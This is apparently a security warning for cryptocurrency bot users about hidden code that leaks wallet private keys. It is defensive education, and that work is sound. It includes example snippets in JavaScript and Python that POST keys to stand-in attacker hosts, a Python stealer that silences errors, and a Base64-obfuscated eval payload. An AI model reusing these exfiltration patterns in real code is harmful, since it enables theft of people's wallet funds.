⚠️ WARNING ⚠️

Do not run bots from unknown sources If you are offered an Automatic Bot, Always Check the File Contents 
To avoid wallet designers or private keys being leaked 

Example of dangerous file contents


### 1. Sending Private Keys or Seed Phrases to External Servers

```js
axios.post('http://malicious-server.com/steal', { privateKey: PRIVATE_KEY });
```

* **Risk:** Private keys or seed phrases are sent in plain text to unknown servers.
* **Impact:** Attackers gain full access to your wallet and can drain funds instantly.

---

### 2. Storing Private Keys in Plain Files

```js
fs.writeFileSync('privatekey.txt', PRIVATE_KEY);
```

* **Risk:** Private keys stored in unsecured files can be accessed by malware or unauthorized users.
* **Impact:** Wallet security is compromised if the device is hacked or shared.

---

### 3. Using Untrusted RPC Providers or APIs

```js
const provider = new ethers.providers.JsonRpcProvider('https://malicious-node.com');
```

* **Risk:** Connecting to malicious or compromised nodes can lead to transaction manipulation.
* **Impact:** Funds can be redirected or stolen without your knowledge.

---

### 4. Collecting Private Keys via Input and Sending to Unknown URLs

```js
const PRIVATE_KEY = readlineSync.question('Enter your private key: ');
fetch('http://badsite.com/steal', { method: 'POST', body: PRIVATE_KEY });
```

* **Risk:** User inputs are exfiltrated to attacker-controlled endpoints.
* **Impact:** Even manual entry can lead to immediate compromise.

---

### 5. Using Unverified Third-Party Libraries or Modules

```js
import maliciousModule from 'some-unknown-lib';
maliciousModule.stealPrivateKey(PRIVATE_KEY);
```

* **Risk:** Hidden malicious code inside dependencies can leak sensitive data.
* **Impact:** Wallets compromised silently via dependencies.

---

### 6. Automatically Signing and Sending Transactions Without Validation

```js
wallet.signTransaction(tx).then(signedTx => {
  provider.sendTransaction(signedTx);
});
```

* **Risk:** Scripts that auto-sign transactions without checks can be abused to send all funds to attacker wallets.
* **Impact:** Wallet drained automatically.

---

### 7. Hidden Backdoors Triggering Unauthorized Transfers

```js
if (someCondition) {
  transferAllFundsTo('0xMaliciousAddress');
}
```

* **Risk:** Conditional logic that triggers fund transfers without user consent.
* **Impact:** Sudden loss of funds without clear cause.

---

## Best Practices to Protect Your Wallet

* **Never expose your private key or seed phrase in your code or to untrusted parties.**
* **Use environment variables or secure vault solutions to handle sensitive data.**
* **Audit open-source code and dependencies before use.**
* **Prefer hardware wallets for better security.**

## What Are Hidden Commands?

Hidden commands are pieces of code designed to run secretly inside the script or bot, performing malicious actions such as:

- Exporting or sending your private keys to attacker servers  
- Running unauthorized network requests (`POST`, `fetch`, `curl`) with sensitive data  
- Executing system commands that open backdoors  
- Obfuscated or encoded code blocks (Base64, Hex, etc.) that hide real behavior  

---

## How to Spot Hidden Commands: Key Indicators

1. **Network Calls Sending Sensitive Data**  
   Look for code sending data outside your device, especially keys or wallet info.

2. **Obfuscated Code**  
   Base64 strings or encrypted code segments that decode and execute commands.

3. **Suspicious Function Names**  
   Functions like `stealKey()`, `backdoor()`, `sendData()`, or anything vaguely suspicious.

4. **Use of Dangerous Functions**  
   `eval()`, `exec()`, `system()`, or anything that executes code dynamically.

5. **Hardcoded Private Keys or URLs**  
   Private keys or suspicious URLs inside the script.

---

## Example of a Hidden Stealing Command in Python

```python
import requests

def steal_private_key(private_key):
    # Sends the private key to attacker's server silently
    url = "https://evil-hacker-site.com/steal"
    try:
        requests.post(url, data={"key": private_key})
    except:
        pass  # Hide errors to avoid detection

# Somewhere in the code, your private key is captured and sent:
my_private_key = "0xYOUR_PRIVATE_KEY_HERE"
steal_private_key(my_private_key)
````

**What’s dangerous here?**
This function quietly sends your secret private key to a hacker’s server. If you run this script with your real key, your wallet is compromised.

---

## Example of Obfuscated Hidden Code in JavaScript

```js
// Base64 encoded malicious code (decoded and executed)
eval(atob('Y29uc3Qgc2VuZEtleSA9IGtleSA9PiB7CiAgY29uc3QgZGF0YSA9IHt9OwogIGNvbnN0IHVybCA9ICJodHRwczovL2V2aWwuaGFja2VyLXNpdGUuY29tL3N0ZWFsIjsKCiAgZmV0Y2godXJsLCB7CiAgICBtZXRob2Q6ICJQT1NUIiwKICAgIGhlYWRlcnM6IHsKICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIgogICAgfSwKICAgIGJvZHk6IGpzb25TdHJpbmdpZnkoaykKICB9KTsKfTsK'));
```

Here, the code is encoded to hide what it really does, which likely includes stealing your key or running malicious commands.

## How to Protect Yourself from Hidden Commands

* **Always review and understand scripts before running.**
* **Use burner wallets on testnets** for testing automation scripts.
* **Never hardcode or share private keys in scripts or chats.**
* **Avoid running obfuscated or unreadable code.**
* **Check network calls in scripts** for suspicious external requests.
* **Run scripts in sandbox environments** if possible.
* **Keep dependencies and packages up-to-date and from trusted sources.**

---

## Final Thoughts

Hidden commands can be subtle but devastating. Your private key is your wallet’s ultimate password — **never let it slip** into unknown hands.

If you’re ever unsure about a script or bot, ask for help, audit with tools, or run tests with burner wallets only.
